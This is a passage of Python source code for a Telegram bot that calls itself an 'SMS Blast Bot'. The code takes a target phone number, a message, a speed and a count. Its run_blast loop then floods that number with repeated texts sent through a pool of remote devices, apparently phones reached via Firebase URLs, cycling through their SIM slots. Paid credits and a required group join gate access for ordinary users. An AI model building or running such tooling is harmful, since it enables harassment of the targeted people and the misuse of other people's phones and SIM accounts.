        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    await state.update_data(message=body)
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed(cq: CallbackQuery, state: FSMContext):
    m = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    spd = m.get(cq.data, SPEED_MEDIUM)
    label = "🚀 FAST" if spd == SPEED_FAST else "⚡ MEDIUM" if spd == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(speed=spd, speed_label=label)
    await state.set_state(S.owner_send_count)
    await cq.message.edit_text(
        f"{label}\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online: <b>{len(CACHED_DEVICES)}</b>",
        reply_markup=back_kb("owner"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.owner_send_count)
async def owner_count(msg: Message, state: FSMContext):
    try:
        count = int((msg.text or "").strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Number bhejo:", parse_mode="HTML")
        return
    data = await state.get_data()
    await state.clear()
    devices = CACHED_DEVICES or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No API online.", reply_markup=back_kb("owner"), parse_mode="HTML")
        return
    await run_blast(msg.bot, msg.chat.id, msg.from_user.id, data["number"], data["message"], count, devices, data["speed"], data["speed_label"])

# ---------- USER SEND ----------
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    if not await check_joined(cq.bot, uid):
        await cq.answer("⛔ Group join karein!", show_alert=True)
        return
    d = load()
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>",
        reply_markup=back_kb("user"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    n = (msg.text or "").strip()
    if not n.replace("+", "").replace(" ", "").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML")
        return
    d = load()
    if n in d.get("protected_numbers", {}):
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} Number protected.", parse_mode="HTML")
        return
    await state.update_data(number=n)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} {mask_number(n)}\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=back_kb("user"),
        parse_mode="HTML",
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    body = (msg.text or "").strip()
    if not body:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML")
        return
    await state.update_data(message=body)
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"),
        parse_mode="HTML",
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    m = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    spd = m.get(cq.data, SPEED_MEDIUM)
    label = "🚀 FAST" if spd == SPEED_FAST else "⚡ MEDIUM" if spd == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(speed=spd, speed_label=label)
    await state.set_state(S.send_count)
    credits = get_credits(uid, d)
    await cq.message.edit_text(
        f"{label}\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{credits}</b>",
        reply_markup=back_kb("user"),
        parse_mode="HTML",
    )
    await cq.answer()

@R.message(S.send_count)
async def user_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        count = int((msg.text or "").strip())
        if count < 1:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Number bhejo:", parse_mode="HTML")
        return
    data = await state.get_data()
    await state.clear()

    credits = get_credits(uid, d)
    if credits <= 0:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} No credits!\n\nJoin group:",
            reply_markup=group_kb(back_prefix="user"),
            parse_mode="HTML",
        )
        return
    if count > credits:
        count = credits

    devices = CACHED_DEVICES or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No API online.", reply_markup=back_kb("user"), parse_mode="HTML")
        return
    await run_blast(msg.bot, msg.chat.id, uid, data["number"], data["message"], count, devices, data["speed"], data["speed_label"])

# ---------- BLAST ----------
async def run_blast(bot: Bot, chat_id: int, uid: int, number: str, message: str, count: int, devices: list, speed: float, speed_label: str):
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            s = USER_SESSIONS[uid]
            if s.task and not s.task.done():
                await bot.send_message(chat_id, "⚠️ Already running", parse_mode="HTML")
                return
        session = UserSession()
        session.number = number
        USER_SESSIONS[uid] = session

    d = load()
    is_regular = not is_owner(uid, d)
    credits_now = get_credits(uid, d) if is_regular else None

    try:
        prog = await bot.send_message(
            chat_id,
            progress_text(0, 0, count, credits_now, speed_label),
            reply_markup=stop_send_kb(),
            parse_mode="HTML",
        )
    except Exception as e:
        log.error(f"progress: {e}")
        USER_SESSIONS.pop(uid, None)
        return

    sent = 0
    failed = 0
    left = count
    last_update = time.time()
    start = time.time()

    async def loop():
        nonlocal sent, failed, left, last_update
        try:
            for dev in devices:
                if left <= 0:
                    break
                async with session.lock:
                    if session.cancelled:
                        break
                slots = [s.get("simSlotIndex", 0) for s in dev.get("sims", [])] or [0]
                quota = min(3, left)
                dev_sent = 0
                for slot in slots:
                    async with session.lock:
                        if dev_sent >= quota or left <= 0 or session.cancelled:
                            break
                    ok = await send_sms_via_device(dev["fb_url"], dev["dev_id"], slot, number, message)
                    async with session.lock:
                        if ok:
                            sent += 1
                            dev_sent += 1
                            left -= 1
                            if is_regular:
                                deduct_credits(uid, 1, d)
                                k = str(uid)
                                if k in d["users"]:
                                    d["users"][k]["uses"] = d["users"][k].get("uses", 0) + 1
                        else:
                            failed += 1
                            left -= 1

                        now = time.time()
                        if now - last_update >= PROGRESS_INTERVAL or (sent + failed) == count or session.cancelled:
                            live = get_credits(uid, load()) if is_regular else None
                            try:
                                await prog.edit_text(
                                    progress_text(sent, failed, count, live, speed_label),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML",
                                )
                            except TelegramBadRequest:
                                pass
                            last_update = now
                    await asyncio.sleep(speed)
        except Exception as e:
            log.error(f"loop: {e}")
        finally:
            async with session.lock:
                session.sent = sent
                session.failed = failed

    task = asyncio.create_task(loop())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        USER_SESSIONS.pop(uid, None)

    d = load()
    d["stats"]["total_sent"] = d["stats"].get("total_sent", 0) + sent
    d["stats"]["total_failed"] = d["stats"].get("total_failed", 0) + failed
    if not is_regular:
        k = str(uid)
        if k in d["users"]:
            d["users"][k]["uses"] = d["users"][k].get("uses", 0) + sent
    save(d)

    duration = int(time.time() - start)
    icon = "✅" if failed == 0 and sent > 0 else "⚠️" if sent > 0 else "❌"
    stopped = "\n🛑 Stopped" if was_cancelled else ""

    back = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")] if is_owner(uid, load()) else [
        btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"),
        btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠"),
    ]

    try:
        await prog.edit_text(
            f"{icon} <b>Result</b>{stopped}\n\n"
            f"To: <code>{mask_number(number)}</code>\n"
            f"Sent: <b>{sent}</b>\n"
            f"Failed: <b>{failed}</b>\n"
            f"Duration: <b>{fmt_duration(duration)}</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]),
            parse_mode="HTML",
        )
    except Exception:
        pass

@R.callback_query(F.data == "user:stop_send")
async def cb_stop(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            await cq.answer("No active send", show_alert=True)
            return
        s.cancelled = True
    await cq.answer("🛑 Stopping...", show_alert=True)

# ========= MAIN =========
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)

    try:
        me = await bot.get_me()
        log.info(f"@{me.username} — SMS Blast Bot {VERSION} started!")
    except Exception as e:
        log.error(f"get_me: {e}")
        await bot.session.close()
        return

    # Send startup progress bar to owner
    try:
        startup_msg = await bot.send_message(MAIN_OWNER, "🚀 *Starting Bot...*", parse_mode="Markdown")
        await show_startup_progress(startup_msg)
        await startup_msg.edit_text(
            f"✅ *Bot Started!*\n\nVersion: `{VERSION}`\nOwner: `{OWNER_NAME}`\nFirebases: `{len(load().get('firebases', []))}`",
            parse_mode="Markdown"
        )
    except Exception as e:
        log.warning(f"Startup progress failed: {e}")

    scanner = asyncio.create_task(background_scanner(bot))

    try:
        await dp.start_polling(
            bot,
            allowed_updates=dp.resolve_used_update_types(),
            drop_pending_updates=True,
            polling_timeout=10,
        )
    finally:
        scanner.cancel()
        try:
            await bot.session.close()
        except Exception:
            pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Stopped")